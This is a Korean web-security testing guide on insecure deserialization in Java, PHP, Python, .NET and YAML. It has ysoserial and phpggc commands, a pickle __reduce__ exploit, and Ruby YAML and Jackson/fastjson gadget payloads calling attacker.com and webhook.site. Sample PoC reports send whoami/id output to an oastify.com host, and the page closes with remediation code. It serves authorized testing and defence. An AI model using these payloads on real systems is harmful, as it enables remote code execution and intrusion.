---
sidebar_position: 29
title: 안전하지 않은 역직렬화 (Insecure Deserialization)
description: 웹 진단 - Java/PHP/Python/.NET 역직렬화 RCE 점검 절차, ysoserial/phpggc, gadget chain, PoC
keywords: [Insecure Deserialization, 역직렬화, ysoserial, phpggc, Java Serialization, PHP unserialize, Python pickle, .NET BinaryFormatter, Gadget Chain, OWASP A08]
draft: false
---

# 안전하지 않은 역직렬화 (Insecure Deserialization)

> 신뢰할 수 없는 직렬화 데이터를 백엔드가 역직렬화하면서 **클래스 메서드 / 매직 메서드 자동 실행** 으로 RCE 로 직결되는 결함.
> Java / PHP / .NET / Python 모두 가능하며, **공개 gadget chain** (ysoserial / phpggc) 으로 단일 결함만으로 시스템 침해.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A08:2025 - Software and Data Integrity Failures / KISA 데이터 무결성 |
| **CWE** | [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html) |
| **영향도** | 🔴 매우 높음 (대부분 RCE) |
| **점검 난이도** | 중 (포맷 식별) / 상 (gadget chain 매칭) |
| **예상 점검 시간** | 2 ~ 8시간 |

---

## 점검 목적

서버가 클라이언트로부터 받은 **직렬화 데이터를 그대로 역직렬화** 하는지 확인한다. 직렬화 포맷 자체가 클래스 메타데이터 + 인스턴스 데이터를 모두 포함하므로, 역직렬화 시 생성자 / `__wakeup` / `readObject` / `__reduce__` 등이 자동 실행되어 **RCE 로 직결**.

> **다른 페이지와 영역 분리**
> - JWT 의 알고리즘 변경 / kid injection → `jwt-attacks.md` (Priority 2). JWT 도 일종의 역직렬화이지만 별도 영역
> - SSTI 와 RCE 결과는 유사하지만 메커니즘 다름 → `ssti.md`
> - XXE → `xxe.md`. XML 역직렬화는 본 페이지에서 한 줄 언급
> - YAML 인젝션 → 본 페이지에서 케이스로 다룸

---

## 유형 구분

| 유형 | 핵심 |
| :--- | :--- |
| **Java Serialization** | `ObjectInputStream.readObject()`. `ysoserial` 로 gadget chain 생성 |
| **PHP `unserialize()`** | `__wakeup`, `__destruct` 매직 메서드 트리거. `phpggc` 로 chain 생성 |
| **Python `pickle.loads()`** | `__reduce__` 메서드로 임의 코드 평가 |
| **.NET BinaryFormatter / Json.NET** | `TypeNameHandling.All` 환경에서 gadget chain |
| **YAML (`PyYAML` `load`)** | Python 객체 그대로 인스턴스화 — RCE |
| **JSON 일부 케이스** | Jackson `enableDefaultTyping`, fastjson `autoType` 활성 시 |
| **XML 객체 역직렬화** | XMLDecoder, Castor, XStream 등 |

---

## 진단 절차

### Step 1. 직렬화 데이터 포인트 식별

응답 / 요청에서 직렬화 데이터 패턴 탐색:

```
[Java Serialization]
- Base64 시작: rO0AB... (0xACED0005)
- Raw bytes: 0xAC ED 00 05
- 쿠키 / 헤더 / 본문에 위 패턴

[PHP serialize]
- O:8:"ClassName":2:{s:4:"prop";s:5:"value";...}
- 쿠키 / hidden field 에 자주

[Python pickle]
- Base64 시작: gASV... (Protocol 4) 또는 \x80\x04
- 거의 안 보이지만 발견 시 즉시 RCE 시도

[.NET]
- AAEAAAD///// (BinaryFormatter Base64)
- ViewState (__VIEWSTATE), AspXAuth 쿠키

[YAML]
- Content-Type: application/yaml
- !!python/object:..., !ruby/object:... 태그
```

### Step 2. 직접 인스턴스화 트리거 시도

발견된 직렬화 데이터를 변조해서 서버가 실제로 역직렬화하는지 확인:

- 데이터를 깨뜨려서 에러 메시지 유도 (스택트레이스에 `ObjectInputStream`, `unserialize`, `pickle` 등 단서)
- 응답 변화 (정상 / 500 / 다른 응답)

### Step 3. Gadget Chain 매칭

라이브러리 / 프레임워크 의존성을 추정 후 해당 gadget chain 적용:

- Java: `ysoserial` 의 chain (CommonsCollections1~7, Spring1~2, Hibernate, Groovy 등)
- PHP: `phpggc` 의 chain (Laravel, Symfony, WordPress, Magento, Drupal 등)
- Python: `__reduce__` 직접 작성
- .NET: `ysoserial.net` 의 chain (TypeConfuseDelegate, ActivitySurrogateSelector 등)

### Step 4. RCE 입증

`curl https://webhook.site/<id>` 또는 `nslookup unique.attacker.com` 으로 OOB 콜백 확인. 직접 명령 결과 응답을 받기 어려운 경우가 많음.

---

## 페이로드 / 테스트 케이스

### 케이스 1: Java Serialization (가장 흔하고 임팩트 큼)

**언제 쓰는지**: Spring / Tomcat / WebLogic / JBoss 환경. 쿠키 / 헤더 / RMI 포트 / JMX 포트 / 본문에 Java 직렬화 데이터 발견.

**1-1. 데이터 포인트 식별:**

```
- 쿠키 값이 rO0AB... 으로 시작 (Base64 인코딩된 Java 직렬화 매직 헤더)
- 응답 헤더 / 본문에 Java 클래스 패스 정보
- 에러 응답에 java.io.ObjectInputStream 단서
```

**1-2. `ysoserial` 로 페이로드 생성:**

```bash
# 일반 RCE - DNS 콜백으로 1차 입증
java -jar ysoserial.jar CommonsCollections5 \
  "curl https://webhook.site/<unique-id>" > payload.bin

# Base64 인코딩 (HTTP 헤더 / 쿠키용)
base64 -w0 payload.bin

# 라이브러리별 chain 시도
# - CommonsCollections1~7 (Apache Commons Collections)
# - Spring1, Spring2
# - Groovy1
# - Hibernate1
# - JSON1
# - Jdk7u21
```

**1-3. 페이로드 적용:**

```http
POST /api/some-endpoint HTTP/1.1
Content-Type: application/x-java-serialized-object

<binary payload bytes>

# 또는 쿠키
Cookie: SESSION=<base64 payload>

# 또는 ViewState 비슷한 hidden field
```

**판정**: 응답 시간 변화 (DNS 콜백 지연) 또는 `webhook.site` / Burp Collaborator 에 DNS / HTTP 콜백 도착하면 RCE 가능 확정. 명령을 `nslookup <unique>.attacker.com` 또는 `curl https://webhook.site/<id>` 로 시작해서 OOB 만으로 입증.

> 운영 환경에서 `rm -rf` 같은 파괴적 명령 절대 금지. `id` / `whoami` / OOB DNS 로만 입증.

### 케이스 2: PHP `unserialize()` + phpggc Gadget Chain

**언제 쓰는지**: PHP 백엔드 + 쿠키 / hidden field 에 PHP serialize 포맷 (`O:N:"..."`) 발견.

**2-1. 식별:**

```
O:8:"UserData":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"guest";}
```

PHP 객체 직렬화의 특징적 포맷. 변조 시 매직 메서드 (`__wakeup`, `__destruct`, `__toString`) 트리거.

**2-2. `phpggc` 로 페이로드 생성:**

```bash
# Laravel 5.4 환경 예시
phpggc Laravel/RCE5 system "id" > payload.txt

# 다른 환경
phpggc Symfony/RCE4 system "id"
phpggc Wordpress/RCE3 system "id"
phpggc Drupal/RCE1 system "id"
phpggc Monolog/RCE1 system "id"

# 사용 가능한 chain 목록
phpggc -l | grep RCE
```

**2-3. 페이로드 적용:**

```http
POST /endpoint HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: user=O%3A8%3A...                    ← URL 인코딩된 phpggc 페이로드

data=O%3A8%3A...
```

**판정**: 명령 결과가 응답에 반환되거나 OOB 콜백 도착 → 취약. PHP 는 `__destruct` 가 요청 종료 시 자동 호출되므로 응답 자체엔 안 나오고 OOB 만 도착하는 경우가 많음.

### 케이스 3: Python `pickle.loads()` — `__reduce__` 인젝션

**언제 쓰는지**: Python 백엔드 + 본문 / 쿠키에 pickle 포맷 (`\x80\x04...` 또는 Base64 `gASV...`) 발견. 흔하진 않지만 발견 시 즉시 RCE.

**3-1. 페이로드 생성:**

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        # pickle 이 역직렬화하면서 이 함수를 호출
        return (os.system, ('curl https://webhook.site/<id>',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
# gASV... 형태로 출력
```

**3-2. 페이로드 적용:**

```http
POST /api/import HTTP/1.1
Content-Type: application/octet-stream

<binary pickle payload>

# 또는 Base64 쿠키
Cookie: state=gASV...
```

**판정**: webhook 콜백 도착 시 RCE 가능 확정. Python `pickle` 은 **신뢰하지 않은 데이터에 절대 사용 금지** 라는 공식 문서 경고가 있을 정도로 위험.

### 케이스 4: YAML 인젝션 (`yaml.load`)

**언제 쓰는지**: 설정 파일 / 입력으로 YAML 을 받는 API. PyYAML 의 `load()` (safe_load 가 아님) 사용 시 RCE.

**페이로드:**

```yaml
!!python/object/apply:os.system ["curl https://webhook.site/<id>"]

# Ruby YAML (Rails)
--- !ruby/object:Gem::Installer
    i: x
--- !ruby/object:Gem::SpecFetcher
    i: y
--- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
      io: &1 !ruby/object:Net::BufferedIO
        io: &1 !ruby/object:Gem::Package::TarReader::Entry
           read: 0
           header: "abc"
        debug_output: &1 !ruby/object:Net::WriteAdapter
           socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                socket: !ruby/module 'Kernel'
                method_id: :system
             git_set: "curl https://webhook.site/<id>"
           method_id: :resolve
```

**판정**: webhook 콜백 → RCE 확정. 안전 패턴은 `yaml.safe_load()` 사용 (Python) / Psych `safe_load` (Ruby).

### 케이스 5: .NET 역직렬화 (BinaryFormatter / Json.NET TypeNameHandling)

**언제 쓰는지**: ASP.NET / WCF / SharePoint / ViewState (`__VIEWSTATE`) 환경.

**5-1. `ysoserial.net` 으로 페이로드 생성:**

```bash
# BinaryFormatter 페이로드
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl https://webhook.site/<id>"

# Json.NET (TypeNameHandling.All 활성 환경)
ysoserial.exe -f Json.Net -g ObjectDataProvider \
  -c "cmd /c curl https://webhook.site/<id>"

# 사용 가능한 gadget
# - TypeConfuseDelegate
# - ActivitySurrogateSelector
# - ObjectDataProvider
# - WindowsIdentity
# - PSObject
```

**5-2. ViewState 시나리오:**

```
- ViewState MAC 검증이 없거나 ValidationKey 노출 시
- __VIEWSTATE 필드에 ysoserial.net 페이로드 삽입
- 페이지 POST 시 .NET 이 역직렬화하면서 gadget chain 실행
```

**판정**: webhook 콜백 도착 → RCE 확정. ASP.NET 의 ViewState MAC 검증이 약점인 경우가 흔함.

### 케이스 6: Java Jackson / fastjson 의 Type Handling

**언제 쓰는지**: JSON API 가 객체 타입을 메타데이터로 받는 경우.

**Jackson - `enableDefaultTyping` 활성:**

```json
[
  "com.sun.rowset.JdbcRowSetImpl",
  {
    "dataSourceName": "ldap://attacker.com/Exploit",
    "autoCommit": true
  }
]
```

LDAP / RMI 서버에서 악성 클래스 다운로드 / 인스턴스화 → RCE.

**fastjson `autoType` 활성:**

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/Exploit",
  "autoCommit": true
}
```

**판정**: webhook 콜백 도착 → 취약. Jackson 의 `enableDefaultTyping` / fastjson `autoType=true` 는 보안 모범사례 위반.

### 그 외 — 한 줄 언급만

- **XML 객체 역직렬화** (XMLDecoder, XStream, Castor) — XXE 와 다르며 클래스 인스턴스화 가능. 발견 시 즉시 RCE. `xxe.md` 와 영역 다름
- **Apache Commons Text `StringSubstitutor`** — 직렬화는 아니지만 `${script:javascript:...}` 으로 RCE. log4shell 류 표현식
- **Log4Shell (`CVE-2021-44228`)** — JNDI lookup 통한 원격 클래스 로드. 별도 영역
- **Ruby Marshal.load** — Ruby 의 직렬화. Rails 의 cookie store 등에서 발견되면 RCE 가능. 빈도 낮음

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] Java 직렬화 (`rO0AB...`, `0xACED0005`) 가 클라이언트 입력으로 들어가고, ysoserial 페이로드로 OOB 콜백 발생
- [ ] PHP 직렬화 (`O:N:"..."`) 가 입력으로 들어가고, phpggc 페이로드로 RCE 발생
- [ ] Python pickle (`gASV...` 또는 `\x80\x04...`) 가 입력으로 들어가고, `__reduce__` 페이로드로 RCE
- [ ] YAML 입력에 `!!python/object/apply` / `!ruby/object` 태그가 평가됨
- [ ] .NET ViewState / 쿠키에 BinaryFormatter 페이로드로 RCE
- [ ] Jackson `enableDefaultTyping` / fastjson `autoType` 활성으로 JSON 페이로드 RCE
- [ ] OOB DNS / HTTP 콜백 도착으로 입증 (직접 명령 응답이 안 와도 RCE 확정)

**오탐 주의:**

- [ ] 직렬화 포맷이 보여도 서버가 실제로 역직렬화하지 않을 수 있음 (단순 데이터 저장용) — 변조 시 응답 변화 확인
- [ ] MAC / HMAC 검증이 있으면 변조 자체가 안 됨 (`SignedObject`, ViewState MAC, JWT 등) — MAC 키 노출 / 우회와 결합
- [ ] OOB 콜백이 안 와도 내부 망이라 차단됐을 가능성 — Time-based (gadget 에 `Thread.sleep`) 로 보조 입증
- [ ] 운영 환경에서 페이로드 실행은 사전 협의 + 비파괴 명령 (`id`, OOB) 으로만

---

## PoC 양식 (보고서 붙여넣기용)

### PoC 1 — [Insecure Deserialization] Java 역직렬화 RCE (ysoserial CommonsCollections5)

1. `<TARGET>` 의 세션 쿠키 값이 Java 직렬화 매직 헤더 (`rO0AB...`) 로 시작
2. ysoserial 의 `CommonsCollections5` chain 으로 OOB DNS 콜백 페이로드 생성
3. 변조된 쿠키 전송 → Burp Collaborator 로 DNS 콜백 도착 → RCE 확정

**1차 확인 — 쿠키 분석:**

```http
Cookie: SESSION=rO0ABXNyAA1qYXZhLnV0aWwuTWFw...
                ↑ Java Serialization Base64
```

Base64 디코딩 시:

```
\xAC\xED\x00\x05    ← Java 직렬화 매직 헤더
sr ... java.util.Map ...
```

**2차 — ysoserial 페이로드 생성:**

```bash
$ java -jar ysoserial.jar CommonsCollections5 \
    "curl http://abc123.oastify.com/$(whoami)" \
    | base64 -w0 > payload.b64

$ cat payload.b64
rO0ABXNyAC5qYXZhLnV0aWwuY29sbGVjdGlvbnMuTWFw...
```

**3차 — 변조 쿠키 전송:**

```http
GET /api/profile HTTP/1.1
Host: <TARGET>
Cookie: SESSION=rO0ABXNyAC5qYXZhLnV0aWwu...
```

**응답:**

```http
HTTP/1.1 500 Internal Server Error

(역직렬화 에러 메시지, 단 chain 실행은 완료된 상태)
```

**Burp Collaborator 도착 (OOB 증거):**

```
DNS Query:   abc123.oastify.com (1회)
HTTP Request: GET /tomcat HTTP/1.1     ← whoami 결과가 URL 에 포함
```

**확인 사항:**
- 세션 쿠키가 Java 직렬화 Base64 형태 → 백엔드가 그대로 `ObjectInputStream.readObject()` 호출
- ysoserial `CommonsCollections5` chain 으로 `Runtime.exec("curl ...")` 트리거
- Burp Collaborator 에 DNS / HTTP 콜백 도착 + URL 에 `whoami` 명령 결과 (`tomcat`) 포함 → RCE 입증
- Apache Commons Collections 라이브러리가 클래스패스에 존재 + 역직렬화 화이트리스트 없음
- 안전 패턴: `ObjectInputFilter` 적용, 직렬화 형식 자체를 JSON / Protobuf 같은 데이터 전용 포맷으로 전환, 세션 데이터는 서버 측 저장 (Redis 등)

---

### PoC 2 — [Insecure Deserialization] PHP unserialize → phpggc Laravel chain RCE

1. `<TARGET>` (Laravel 기반) 의 hidden field 값이 PHP serialize 포맷 (`O:...:"..."`)
2. phpggc 의 `Laravel/RCE5` chain 으로 페이로드 생성
3. 변조된 페이로드 전송 → OOB 콜백 도착

**1차 확인:**

```http
POST /api/state HTTP/1.1
Content-Type: application/x-www-form-urlencoded

state=O%3A29%3A%22Illuminate%5CSupport%5CMessageBag%22%3A...
```

URL 디코딩 시 `O:29:"Illuminate\Support\MessageBag":...` — Laravel 클래스의 PHP 직렬화 데이터.

**2차 — phpggc 페이로드:**

```bash
$ phpggc Laravel/RCE5 system "curl http://abc123.oastify.com/$(id)"
O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{...}

$ phpggc Laravel/RCE5 system "curl ..." | xxd | head
# 페이로드를 URL 인코딩
```

**3차 — 변조 전송:**

```http
POST /api/state HTTP/1.1
Content-Type: application/x-www-form-urlencoded

state=O%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7B...
```

**OOB 콜백 (Burp Collaborator):**

```
HTTP GET /uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**확인 사항:**
- hidden field 값이 PHP `unserialize` 로 그대로 처리됨
- Laravel + GuzzleHttp 의 매직 메서드 chain 으로 `system()` 호출 트리거
- `id` 명령 결과가 URL 의 일부로 OOB 콜백 도착 → RCE 확정
- 안전 패턴: `unserialize` 자체 사용 금지, `json_decode` 또는 `igbinary_unserialize` (안전 옵션) 사용, 신뢰 입력만 역직렬화

---

## 영향도 분석

- **기밀성 (Confidentiality)**: 🔴 **매우 높음** — RCE 시 모든 데이터 / 자격증명 노출
- **무결성 (Integrity)**: 🔴 — 임의 파일 변조, DB / 시스템 변경
- **가용성 (Availability)**: 🔴 — 시스템 정지, 컨테이너 / 호스트 장악
- **추가 위협**:
  - **내부망 피벗** — RCE 후 인접 서비스 침투
  - **클라우드 자격증명 탈취** — IMDS 호출 (`ssrf.md` 와 결합)
  - **CI/CD / 빌드 서버 침해** — 공급망 침해까지 확장

**비즈니스 임팩트:**
역직렬화 결함은 발견 빈도는 SQL/XSS 보다 낮지만, 발견되면 거의 100% RCE 로 직결되어 단일 결함으로 시스템 전체 침해 등급. 특히 ysoserial / phpggc 의 공개 gadget chain 으로 익스플로잇이 단순해서 노출되면 즉시 악용 가능. 진단 시 직렬화 포맷이 보이는 모든 데이터 포인트는 빠짐없이 점검.

---

## 대응방안

### 개발자 관점 (필수)

1. **신뢰하지 않는 입력은 절대 역직렬화 금지** — 가장 본질적 방어. 외부 입력은 데이터 전용 포맷 (JSON / Protobuf / MessagePack) 만 사용:

   ```python
   # 위험 — pickle 은 신뢰 입력만
   user_obj = pickle.loads(request.body)

   # 안전 — JSON 만 사용 + 명시적 필드 매핑
   data = json.loads(request.body)
   user = User(id=int(data['id']), name=str(data['name']))
   ```

2. **MAC / HMAC 무결성 검증** — 서버가 발급한 직렬화 데이터를 클라이언트가 받았다가 돌려보내는 흐름이라면 HMAC 서명:

   ```python
   import hmac, hashlib

   def sign(data):
       sig = hmac.new(SECRET, data, hashlib.sha256).hexdigest()
       return base64.b64encode(data) + '.' + sig

   def verify_and_load(token):
       data_b64, sig = token.rsplit('.', 1)
       data = base64.b64decode(data_b64)
       expected = hmac.new(SECRET, data, hashlib.sha256).hexdigest()
       if not hmac.compare_digest(sig, expected):
           raise SecurityError()
       return pickle.loads(data)        # 서명 검증 후에만
   ```

3. **언어별 안전 함수 / 옵션:**

   ```python
   # Python
   yaml.safe_load(data)              # yaml.load 대신
   json.loads(data)                  # pickle.loads 대신

   # PHP — unserialize 자체 사용 금지가 원칙
   json_decode($input, true)          # unserialize 대신
   ```

   ```java
   // Java — ObjectInputFilter (JEP 290, Java 9+)
   ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
       "com.example.allowed.*;!*");    // 허용 클래스만 명시
   ois.setObjectInputFilter(filter);

   // 또는 직렬화 자체를 JSON 으로 전환 (Jackson 사용 시 enableDefaultTyping 비활성)
   ```

   ```csharp
   // .NET — BinaryFormatter 사용 금지 (deprecated)
   // System.Text.Json 또는 Newtonsoft.Json 사용
   // Json.NET 사용 시 TypeNameHandling.None (기본값)
   JsonConvert.SerializeObject(obj, new JsonSerializerSettings {
       TypeNameHandling = TypeNameHandling.None
   });
   ```

4. **세션 데이터는 서버 측 저장** — 쿠키에 직렬화 객체를 담지 말고 세션 ID 만 + Redis / DB 측 저장:

   ```python
   # 위험 — 쿠키에 직렬화 객체 전체
   response.set_cookie('user_data', pickle.dumps(user))

   # 안전 — 세션 ID 만
   session_id = create_session_in_redis(user)
   response.set_cookie('SESSION', session_id, httponly=True, secure=True)
   ```

5. **라이브러리 / 프레임워크 보안 옵션 활성:**
   - Jackson: `enableDefaultTyping` 비활성 (기본값) 유지
   - fastjson: `autoType=false`, fastjson2 로 마이그레이션
   - Spring: `RemoteInvocation` / RMI 비활성, JMX 인증 강제
   - Apache Commons Collections: 가능하면 의존성 제거 또는 최신 버전 (gadget 제한)

6. **언어 / 프레임워크 업데이트** — 역직렬화 관련 CVE 는 매년 발견됨 (`CVE-2023-...`). 의존성 자동 업데이트 + 보안 패치 우선.

### 운영자 관점

1. **WAF 룰 — 보조 수단** — Java (`rO0AB`), PHP (`O:[0-9]+:`), pickle (`gASV` / `\x80\x04`) 패턴 차단. 변형이 많아 단독 의존 금지.

2. **이상 응답 모니터링** — 500 에러 + 스택트레이스에 `ObjectInputStream` / `unserialize` 패턴 알람.

3. **OOB 콜백 모니터링** — 운영 서버에서 외부 도메인으로 나가는 DNS / HTTP 요청 패턴 분석 (`webhook.site`, `*.oastify.com`, 알려진 OOB 도메인).

4. **컨테이너 / 권한 격리** — RCE 가 터져도 피해 면 축소. IMDS v2, 네트워크 정책, 최소 권한 컨테이너.

### 안전 / 위험 코드 비교

**Java:**

```java
// 위험 — 입력 그대로 역직렬화
public Object load(byte[] data) throws IOException {
    try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
        return ois.readObject();           // 임의 클래스 인스턴스화 가능
    }
}

// 안전 1 — ObjectInputFilter (JEP 290, Java 9+)
public Object load(byte[] data) throws IOException {
    try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
        ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter(
            "com.example.dto.*;java.lang.String;java.util.HashMap;!*"
        ));
        return ois.readObject();
    }
}

// 안전 2 — JSON 으로 전환 (가장 권장)
ObjectMapper mapper = new ObjectMapper();
UserDto user = mapper.readValue(jsonData, UserDto.class);   // 타입 명시
```

**PHP:**

```php
// 위험 — unserialize 그대로
$user = unserialize($_COOKIE['user_data']);

// 안전 — json_decode 사용 + 명시적 매핑
$data = json_decode($_COOKIE['user_data'], true);
if (!is_array($data)) {
    throw new InvalidInput();
}
$user = new User(
    id: (int)($data['id'] ?? 0),
    name: (string)($data['name'] ?? '')
);

// 부득이하게 unserialize 가 필요하면 allowed_classes 명시 (PHP 7+)
$user = unserialize($data, ['allowed_classes' => ['UserDto']]);
```

**Python:**

```python
# 위험 — pickle 은 신뢰 입력만
import pickle
user = pickle.loads(request.cookies['user'])     # 절대 금지

# 안전 — JSON + 명시적 매핑
import json
data = json.loads(request.cookies['user'])
user = User(id=int(data['id']), name=str(data['name']))

# YAML
import yaml
config = yaml.safe_load(file_content)             # yaml.load 대신
```

**.NET:**

```csharp
// 위험 — BinaryFormatter (deprecated, .NET 5+ 에서 obsolete)
var formatter = new BinaryFormatter();
var obj = formatter.Deserialize(stream);

// 안전 — System.Text.Json 또는 Newtonsoft.Json 의 안전 옵션
using System.Text.Json;
var user = JsonSerializer.Deserialize<User>(json);

// Newtonsoft.Json - TypeNameHandling.None (기본값) 유지
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.None     // 절대 .All 사용 금지
};
var user = JsonConvert.DeserializeObject<User>(json, settings);
```

---

## 참고자료

- [OWASP Cheat Sheet - Deserialization](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [OWASP Testing Guide - Testing for Deserialization](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Local_File_Inclusion)
- [PortSwigger - Insecure deserialization](https://portswigger.net/web-security/deserialization)
- [PortSwigger - Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting)
- [ysoserial GitHub](https://github.com/frohoff/ysoserial)
- [phpggc GitHub](https://github.com/ambionics/phpggc)
- [ysoserial.net GitHub](https://github.com/pwntester/ysoserial.net)
- [Java JEP 290 - Filter Incoming Serialization Data](https://openjdk.org/jeps/290)
- [HackTricks - Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization)
